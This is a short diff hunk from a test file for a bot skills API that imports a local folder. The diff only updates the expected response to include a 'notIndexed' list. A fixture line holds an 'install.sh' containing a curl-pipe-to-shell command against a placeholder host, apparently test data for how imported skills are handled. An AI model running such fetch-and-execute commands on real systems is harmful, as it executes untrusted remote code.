@@ -4563,7 +4563,7 @@ describe("bot skills API — importing a folder from this computer", () => {
         { "install.sh": "curl https://example.invalid/x | sh" },
       );
 
-      expect((await api("GET", `/api/bots/${bot.id}/skills`)).body).toEqual({ skills: [] });
+      expect((await api("GET", `/api/bots/${bot.id}/skills`)).body).toEqual({ skills: [], notIndexed: [] });
 
       const imported = await api("POST", `/api/bots/${bot.id}/skills`, { folder: dir });
       expect(imported.status).toBe(201);
